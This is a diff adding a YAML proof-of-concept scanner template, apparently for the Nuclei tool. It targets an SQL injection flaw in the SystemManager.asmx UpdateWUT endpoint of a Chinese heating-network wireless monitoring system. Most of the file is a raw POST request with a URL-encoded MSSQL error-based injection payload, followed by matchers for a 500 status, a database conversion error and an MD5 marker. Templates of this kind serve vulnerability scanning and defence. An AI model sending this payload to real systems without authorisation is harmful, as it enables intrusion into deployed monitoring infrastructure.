@@ -1,0 +1,30 @@
+id: poc-yaml-rewang-wuxian-jiance-system-systemmanager-asmx-sqli
+info:
+  name: 热网无线监测系统 SystemManager.asmx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: '{{rand_int(1000, 10000)}}'
+  t2: '{{md5(t1)}}'
+
+http:
+  - raw:
+      - |
+        POST /DataSrvs/SystemManager.asmx/UpdateWUT HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        id=%28SELECT+CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28CASE+WHEN+%281675%3D1675%29+THEN+sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27{{t1}}%27))+ELSE+CHAR%2848%29+END%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28118%29%2BCHAR%28118%29%2BCHAR%28113%29%29&name=&desc=
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "在将 nvarchar 值"
+          - "转换成数据类型 int 时失败"
+          - "{{t2}}"
